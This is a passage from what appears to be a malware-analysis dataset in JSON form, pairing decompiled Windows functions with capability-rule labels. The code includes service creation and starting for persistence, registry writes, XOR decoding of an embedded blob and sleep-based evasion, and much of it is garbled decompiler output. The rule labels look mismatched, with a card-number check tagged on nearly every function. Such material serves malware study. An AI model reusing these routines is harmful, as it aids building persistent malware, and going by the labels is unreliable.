1U) == 0;\n        if (var_44h == NULL) {\n            *in_FS_OFFSET = var_ch;\n            return 1;\n        }\n        uVar9 = 0x407408;\n        iVar1 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x407408);\n        if ((bVar8) || (!bVar8)) goto code_r0x00401523;\n        puVar6 = segment(in_SS, *0x10 + -0x268);\n        if (bVar7) goto code_r0x00401544;\n        unaff_EDI = var_44h;\n    } while (bVar8);\n    iVar1 = *puVar6;\n    uVar9 = 0xb7bc9ea5;\ncode_r0x00401523:\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, iVar1, 0, 0, 2, 1000, &fcn.004014a0::lpdwResult, uVar9);\ncode_r0x00401544:\n    uStack12 = 0x40741c;\n    var_10h = 0x401562;\n    var_ch = var_44h;\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    var_1ch = lpdwResult;\n    if (pcVar2 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_10h = &fcn.004014a0::var_20h;\n    var_14h = NULL;\n    lpdwResult = str._D_3;\n    var_4h = 0;\n    var_20h = 0x401592;\n    iVar1 = (*pcVar2)();\n    if ((iVar1 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            var_24h = 0x40196d;\n            (**(*var_20h + 8))();\n        }\n    }\n    else {\n        iVar1 = *var_20h;\n        var_24h = var_20h;\n        var_4h._0_1_ = 1;\n        var_20h = &fcn.004014a0::var_24h;\n        iVar1 = (**(iVar1 + 0x20))();\n        if ((iVar1 < 0) || (var_24h == NULL)) {\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                iVar4 = *var_24h;\n                var_20h = var_24h;\n                var_24h = 0x401946;\n                (**(iVar4 + 8))();\n            }\n            var_4h = 0xffffffff;\n            if (var_20h != NULL) {\n                var_24h = 0x40195a;\n                (**(*var_20h + 8))();\n            }\n        }\n        else {\n            var_20h = &fcn.004014a0::var_1ch;\n            var_1ch = 0;\n            var_28h = 0x4015da;\n            (**(*var_24h + 0x24))();\n            if (0 < var_1ch) {\n                do {\n                    var_20h = 0x4015ee;\n                    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_44h = var_24h;\n                    piVar5 = iVar1 % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    iVar4 = var_34h;\n                    hWnd = NULL;\n                    var_10h = NULL;\n                    var_20h = &fcn.004014a0::hWnd;\n                    iVar1 = *var_24h;\n                    var_4h._0_1_ = 4;\n                    var_24h = var_28h;\n                    var_40h = var_34h;\n                    var_34h = var_28h;\n                    iVar1 = (**(iVar1 + 0x2c))();\n                    if ((iVar1 < 0) || (hWnd == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))();\n                        }\njoined_r0x004018e0:\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))();\n                        }\ncode_r0x004018ec:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)();\n                        break;\n                    }\n                    piStack84 = hWnd;\n                    uStack88 = 0x401665;\n                    iVar1 = (***hWnd)();\n                    if ((iVar1 < 0) || (var_10h == NULL)) {\njoined_r0x004018a7:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))();\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))();\n                        }\n                        goto code_r0x004018ec;\n                    }\n                    piStack84 = 0x401684;\n                    iVar1 = (**(*var_10h + 0x38))();\n                    if (iVar1 < 0) goto joined_r0x004018a7;\n                    if (piVar5 == NULL) {\njoined_r0x004016e3:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))();\n                        }\n                        var_4h._0_1_ = 2;\n                        var_28h = piVar5;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))();\n                        }\n                    }\n                    else {\n                        uStack88 = 0x4016b4;\n                        piStack84 = piVar5;\n                        fcn.004012a0();\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)();\n                        piStack84 = &fcn.004014a0::var_24ch;\n                        uStack88 = 0x4016d3;\n                        iVar3 = (*_sym.imp.MSVCRT.dll__stricmp)();\n                        if (iVar3 != 0) goto joined_r0x004016e3;\n                        var_14h = NULL;\n                        piStack84 = hWnd;\n                        var_4h._0_1_ = 5;\n                        uStack88 = 0x40171d;\n                        iVar1 = (***hWnd)();\n                        if ((iVar1 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))();\n                            }\njoined_r0x0040188c:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))();\n                            }\n                            goto joined_r0x004018e0;\n                        }\n                        piStack84 = 0x40173c;\n                        iVar1 = (**(*var_14h + 0x20))();\n                        if (iVar1 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))();\n                            }\n                            goto joined_r0x0040188c;\n                        }\n                        if (iVar4 == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))();\n                            }\n                            var_4h._0_1_ = 3;\n                            var_40h = iVar4;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))();\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar6 = &fcn.004014a0::var_147h;\n                            var_28h = piVar5;\n                            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                                *puVar6 = 0;\n                                puVar6 = puVar6 + 1;\n                            }\n                            *puVar6 = 0;\n                            *(puVar6 + 2) = 0;\n                            piStack84 = iVar4;\n                            uStack88 = 0x4017aa;\n                            fcn.004012a0();\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)();\n                            piStack84 = 0x4017c3;\n                            iVar4 = fcn.004013c0(&stack0xfffffeb4);\n                            if (iVar4 == 0) {\n                                piStack84 = 0x40184b;\n                                (*_sym.imp.KERNEL32.dll_Sleep)();\n                                piStack84 = var_10h;\n                                uStack88 = 0x401857;\n                                (**(*var_10h + 0x114))();\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))();\n                                }\n                                goto joined_r0x004018a7;\n                            }\n                            piStack84 = 0x4017d1;\n                            (*_sym.imp.KERNEL32.dll_Sleep)();\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))();\n                            }\n                            var_4h._0_1_ = 3;\n                            piVar5 = var_28h;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))();\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        var_28h = piVar5;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))();\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)();\n                } while (var_40h + 1 < var_1ch);\n            }\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                iVar4 = *var_24h;\n                var_20h = var_24h;\n                var_24h = 0x401902;\n                (**(iVar4 + 8))();\n            }\n            var_4h = 0xffffffff;\n            if (var_20h != NULL) {\n                var_24h = 0x401916;\n                (**(*var_20h + 8))();\n            }\n        }\n    }\n    var_24h = 0x401920;\n    var_20h = var_44h;\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)();\n    var_24h = 0x401926;\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar1;\n}\n",
        "token_count": 2972
    },
    "004019f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delay execution"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401a77) overlaps instruction at (ram,0x00401a76)\n// \n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00401ab0)\n\nuint fcn.004019f0(uint *param_1)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint uVar2;\n    uint8_t extraout_CL;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint *puVar5;\n    bool bVar6;\n    unkbyte6 Var7;\n    uchar uVar8;\n    uint *puStack296;\n    uchar *puStack292;\n    uint uStack288;\n    uint *puStack284;\n    uint *puStack280;\n    uchar *puStack276;\n    uchar auStack8 [4];\n    \n    puVar4 = &stack0xfffffffc;\n    if ((SBORROW4(&stack0xfffffffc, 0x108)) || (!SBORROW4(&stack0xfffffffc, 0x108))) {\n        puStack276 = &stack0xfffffff8;\n    }\n    else {\n        puStack276 = in_EAX + 1;\n        param_1 = unaff_ESI + 1;\n        *unaff_EDI = *unaff_ESI;\n        puVar4 = &stack0xfffffffd;\n        unaff_EDI = unaff_EDI + 1;\n    }\n    puStack284 = 0x401a16;\n    puStack280 = param_1;\n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)();\n    if (*(puVar4 + 0xc) == *(puVar4 + -4)) {\n        bVar6 = true;\n        puVar4[-0x108] = 0;\n        puStack292 = puVar4 + -0x108;\n        puVar5 = puVar4 + -0x107;\n        for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        *puVar5 = 0;\n        uStack288 = 0x104;\n        *(puVar5 + 2) = 0;\n        puStack296 = param_1;\n        puStack284 = unaff_EDI;\n        Var7 = (*_sym.imp.USER32.dll_GetClassNameA)();\n        if ((bVar6) || (uVar8 = puVar5 + 3 >> 0x18,  !bVar6)) {\n            iVar3 = (*_sym.imp.MSVCRT.dll__stricmp)();\n            if (iVar3 != 0) {\n                return 1;\n            }\n            puStack296 = NULL;\n            uVar8 = 0;\n            (*_sym.imp.USER32.dll_EnumChildWindows)();\n            iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n            uVar1 = (iVar3 % 10 + 4) * 0x7d;\n        }\n        else {\n            uVar2 = in(Var7 >> 0x20);\n            *(puVar5 + 3) = uVar2;\n            if (0 < &stack0xfffffed8) {\n                uVar1 = Var7 ^ 0xdee0ed6d;\n                puVar4[-0x1077b] = puVar4[-0x1077b] ^ extraout_CL;\n    // WARNING: Could not recover jumptable at 0x00401a7c. Too many branches\n    // WARNING: Treating indirect jump as call\n                uVar2 = (**((uVar1 & 0xffff0000 | uVar1 + (uVar1 >> 8) * -0x31) - 0x28))();\n                return uVar2;\n            }\n            uVar1 = Var7 + 0x80;\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(uVar1 << 3, uVar8);\n        (*_sym.imp.USER32.dll_PostMessageA)(param_1, 0x10, 0, 0);\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 948
    },
    "004027a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004027a0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00404680(arg_8h, arg_ch, &var_8h, &var_4h);\n    if (iVar1 != 0) {\n        *(iVar1 + 0x58) = var_4h;\n        fcn.00404680(arg_8h, arg_ch, &var_8h);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 154
    },
    "00402d90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402dd8) overlaps instruction at (ram,0x00402dd6)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00402d90(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t extraout_ECX;\n    uint32_t uVar4;\n    char *pcVar6;\n    int32_t unaff_EBX;\n    uint32_t uVar7;\n    uchar *puVar8;\n    uint *puVar9;\n    uint *puVar10;\n    ulong uVar11;\n    uint uStack32;\n    uint uStack28;\n    char cVar5;\n    \n    uVar11 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    pcVar6 = uVar11 >> 0x20;\n    iVar2 = uVar11;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    uVar4 = extraout_ECX;\n    if (-1 < iVar2) {\n        uStack28 = CONCAT22(extraout_ECX, uStack28);\n        uVar4 = extraout_ECX & 0xffff;\n        cVar5 = uVar4 >> 8;\n        if (-1 >= iVar2) goto code_r0x00402dd5;\n    }\n    cVar5 = uVar4 >> 8;\n    uStack28 = 0;\n    uStack32 = 0;\ncode_r0x00402dd5:\n    uVar7 = &stack0xffffffe0 ^ *(unaff_EBX + 0x6a);\n    *pcVar6 = *pcVar6 + cVar5;\n    *(uVar7 - 4) = iVar2;\n    pcVar1 = _sym.imp.ADVAPI32.dll_StartServiceA;\n    puVar8 = uVar7 - 8;\n    *(uVar7 - 8) = 0x402de3;\n    iVar3 = (*pcVar1)();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        puVar9 = puVar8 + -4;\n        puVar8 = puVar8 + -4;\n        *puVar9 = 0x402def;\n        iVar3 = (*pcVar1)();\n        if (iVar3 != 0x420) {\n            puVar10 = puVar8 + -4;\n            puVar8 = puVar8 + -4;\n            *puVar10 = 0x402df8;\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                *(puVar8 + -4) = iVar2;\n                pcVar1 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n                *(puVar8 + -8) = 0x402e08;\n                (*pcVar1)();\n                return 0;\n            }\n        }\n    }\n    *(puVar8 + -4) = iVar2;\n    pcVar1 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n    *(puVar8 + -8) = 0x402e1a;\n    (*pcVar1)();\n    return 1;\n}\n",
        "token_count": 728
    },
    "00403030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004030dc) overlaps instruction at (ram,0x004030db)\n// \n// WARNING: Removing unreachable block (ram,0x004030b0)\n// WARNING: Removing unreachable block (ram,0x0040308a)\n\nvoid __cdecl fcn.00403030(uchar *arg_8h, uint *arg_ch)\n\n{\n    char *pcVar1;\n    char cVar2;\n    char *in_EAX;\n    uint16_t uVar3;\n    int32_t in_ECX;\n    uint16_t in_DX;\n    uint8_t uVar4;\n    uint8_t uVar5;\n    uint unaff_EBX;\n    int32_t *unaff_EDI;\n    uint16_t in_ES;\n    uint8_t in_AF;\n    bool bVar6;\n    bool bVar7;\n    bool bVar8;\n    float10 in_ST0;\n    float10 in_ST1;\n    float10 in_ST2;\n    float10 in_ST3;\n    float10 in_ST4;\n    float10 in_ST5;\n    float10 in_ST6;\n    float10 in_ST7;\n    double in_stack_46c692c5;\n    \n    *arg_8h = 0x3f;\n    uVar3 = in_ECX + 1;\n    bVar6 = ((uVar3 & 0xff | (uVar3 >> 8 & in_EAX + 2U) << 8) & 0x7bc9) != 0;\n    arg_8h[1] = 0x5b;\n    if ((bVar6) && (!bVar6)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    arg_8h[2] = 0x7d;\n    arg_8h[3] = 0xa4;\n    do {\n        arg_8h[4] = 0xbd;\n        uVar3 = in_ECX + 1;\n        bVar6 = ((uVar3 & 0xff | (uVar3 >> 8 & in_EAX + 2U) << 8) & 0x7bc9) == 0;\n        arg_8h[5] = 0x37;\n        if ((bVar6) || (!bVar6)) {\n            arg_8h[6] = 0x2e;\n        }\n        in_ST0 = in_ST0 - in_stack_46c692c5;\n        uVar5 = unaff_EBX >> 8 ^ 0x16 | in_EAX >> 8;\n        uVar4 = in_DX >> 8;\n        bVar8 = SBORROW1(uVar5, uVar4);\n        bVar7 = uVar5 - uVar4 < '\\0';\n        bVar6 = uVar5 == uVar4;\n        arg_8h[7] = 8;\n        if ((uVar4 < uVar5) && (bVar6 || uVar5 < uVar4)) {\ncode_r0x0040312a:\n            arg_ch = arg_ch & 0xffffff | (arg_ch._3_1_ | in_ECX >> 8) << 0x18;\n            *in_EAX = *in_EAX + in_EAX;\n            arg_8h[-0x75] = arg_8h[-0x75] + (in_EAX >> 8);\n            uVar3 = in_EAX * arg_8h[-0x79];\n            in_EAX = in_EAX & 0xffff0000 | uVar3;\n            *unaff_EDI = in_ST0 - in_stack_46c692c5;\n            *in_EAX = *in_EAX + uVar3;\n            pcVar1 = in_EAX + 0x4bb148d3;\n            cVar2 = uVar3 >> 8;\n            bVar8 = SCARRY1(*pcVar1, cVar2);\n            *pcVar1 = *pcVar1 + cVar2;\n            bVar7 = *pcVar1 < '\\0';\n            bVar6 = *pcVar1 == '\\0';\n            out(*arg_8h, in_DX);\n            arg_8h = arg_8h + 1;\n            in_ST0 = in_ST1;\n            in_ST1 = in_ST2;\n            in_ST2 = in_ST3;\n            in_ST3 = in_ST4;\n            in_ST4 = in_ST5;\n            in_ST5 = in_ST6;\n            in_ST6 = in_ST7;\n        }\n        else {\n            arg_8h[8] = 0x6d;\n            if ((!bVar6) && (bVar6)) {\n                in_EAX = in_EAX & 0xffffff00 | *0x4bb148d3;\n                goto code_r0x0040312a;\n            }\n        }\n        arg_8h[9] = 0xd2;\n        if ((bVar6 || bVar8 != bVar7) || (!bVar6 && bVar8 == bVar7)) {\n            *arg_ch = 10;\n            return;\n        }\n        in_AF = 9 < (in_EAX & 0xf) | in_AF;\n        in_EAX = in_EAX & 0xffff0000 | CONCAT11((in_EAX >> 8) + in_AF, in_EAX + in_AF * '\\x06') & 0xff0f;\n        if (in_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        in_ECX = 0;\n        in_DX = in_ES;\n    } while( true );\n}\n",
        "token_count": 1263
    },
    "00403170": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403198) overlaps instruction at (ram,0x00403197)\n// \n// WARNING: Removing unreachable block (ram,0x0040318e)\n\nvoid __cdecl fcn.00403170(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00403030(&var_68h, &var_4h);\n    fcn.00403440(&var_68h, var_4h, 0x407494, 0x9f80);\n    *arg_8h = 0x407494;\n    *arg_ch = 0x9f80;\n    return;\n}\n",
        "token_count": 283
    },
    "004032c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403328) overlaps instruction at (ram,0x00403327)\n// \n\nuint32_t fcn.004032c0(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint8_t *unaff_EBX;\n    ulong uVar3;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    uVar3 = fcn.00403360(0x80000002, str.Y_fy, 0x407334, &var_8h, &var_10ch, &var_4h);\n    iVar2 = uVar3;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    if ((-1 < iVar2) && (-1 >= iVar2)) {\n        *unaff_EBX = *unaff_EBX & 0xc3;\n    // WARNING: Could not recover jumptable at 0x0040332d. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar1 = (**(uVar3 >> 0x20))();\n        return uVar1;\n    }\n    iVar2 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n    return iVar2 != -1;\n}\n",
        "token_count": 306
    },
    "00403420": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00403420(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 48
    },
    "00403440": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004034b6)\n\nvoid __cdecl fcn.00403440(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (arg_14h != 0) {\n        do {\n            *(uVar1 + arg_10h) = *(uVar1 + arg_10h) ^ *(uVar1 % arg_ch + arg_8h);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "004034e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004034e0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 139
    },
    "004037a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.004037a0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *var_4h;\n    \n    var_4h = NULL;\n    iVar2 = fcn.004036c0(&var_4h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = var_4h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071dc, 0x40721c, 1, var_4h, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 248
    },
    "00403850": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040391b) overlaps instruction at (ram,0x00403912)\n// \n// WARNING: Removing unreachable block (ram,0x00403892)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00403850(int32_t param_1, int32_t param_2, int32_t param_3, char **param_4, int32_t param_5)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    char **ppcVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    char **ppcVar6;\n    uint8_t uVar7;\n    uint32_t unaff_EBX;\n    int32_t iVar8;\n    char **unaff_EDI;\n    bool bVar9;\n    char **ppcStack12;\n    \n    bVar9 = false;\n    ppcStack12 = NULL;\n    if (0 < param_4) {\n        ppcVar6 = param_4;\n        iVar8 = 1;\n        ppcVar3 = param_4;\n        do {\n            if (bVar9 == ppcVar3 < 0) {\n                if (bVar9 != ppcVar3 < 0) {\n                    out(0xc4, ppcVar6);\n                    *unaff_EDI = ppcVar6;\n                    bVar9 = SBORROW1(unaff_EBX >> 8, *ppcVar6);\n                }\n            }\n            uVar7 = *(ppcStack12 + param_3);\n            if ((!bVar9) && (bVar9)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            uVar1 = *(iVar8 % param_2 + param_1);\n            uVar2 = *((iVar8 + -1) % param_2 + param_1);\n            *(iVar8 + 0x43d1773a) = *(iVar8 + 0x43d1773a) ^ 0x5127e95e;\n            uVar5 = param_4 * '\\x02';\n            uVar7 = uVar5 ^ uVar7 ^ uVar2;\n            *(param_5 + -1 + iVar8) = uVar7;\n            uVar4 = unaff_EBX & 0xffffff00;\n            if (uVar7 != 0) {\n                uVar4 = unaff_EBX & 0xff00;\n            }\n            unaff_EBX = uVar4;\n            *(iVar8 + param_5) = uVar5 ^ uVar1;\n            ppcVar6 = ppcStack12 + 1;\n            bVar9 = SBORROW4(ppcVar6, param_4);\n            ppcVar3 = ppcVar6 - param_4;\n            iVar8 = iVar8 + 2;\n            unaff_EDI = param_4;\n            ppcStack12 = ppcVar6;\n        } while (ppcVar6 < param_4);\n    }\n    return;\n}\n",
        "token_count": 686
    },
    "00403970": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004039ae) overlaps instruction at (ram,0x004039ad)\n// \n// WARNING: Control flow encountered bad instruction data\n\nvoid __cdecl fcn.00403970(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    uint32_t extraout_ECX;\n    uint32_t uVar3;\n    char *unaff_EBX;\n    int32_t unaff_EDI;\n    uchar in_CF;\n    bool bVar4;\n    ulong uVar5;\n    \n    if (arg_ch == 1) {\n        fcn.004039f0();\n        bVar4 = unaff_EBX == 0xffffffff;\n        uVar2 = fcn.00404890();\n        if ((in_CF || bVar4) || (!in_CF && !bVar4)) {\n            uVar5 = fcn.00401b10();\n        }\n        else {\n            uVar3 = extraout_ECX & 0xffff0000 | CONCAT11((extraout_ECX >> 8) - *unaff_EBX, extraout_ECX);\n            uVar5 = CONCAT44(uVar3, uVar2);\n            piVar1 = unaff_EDI + -0x18;\n            *piVar1 = *piVar1 - &stack0xfffffff0;\n            if (uVar3 != 1 && *piVar1 == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n        }\n        (**(uVar5 + 0x52))(uVar5 >> 0x20, uVar5);\n        if (*0x423468 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00402850();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 451
    },
    "00404600": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404600(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint uVar1;\n    \n    arg_8h_00 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    fcn.00404ad0(arg_8h_00, arg_8h);\n    uVar1 = fcn.004034e0(arg_8h_00, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(arg_8h_00);\n    return uVar1;\n}\n",
        "token_count": 145
    },
    "004047e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.004047e0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t unaff_EDI;\n    bool bVar3;\n    bool bVar4;\n    \n    uVar2 = 0;\n    bVar3 = false;\n    bVar4 = arg_ch == 0;\n    if (!bVar4) {\n        do {\n            if ((!bVar3 && !bVar4) && (bVar3 || bVar4)) {\n                uVar2 = unaff_EDI;\n            }\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n            bVar3 = uVar2 < arg_ch;\n            bVar4 = uVar2 == arg_ch;\n        } while (bVar3);\n    }\n    return;\n}\n",
        "token_count": 239
    },
    "00404a30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "get service handle",
            "delete service"
        ],
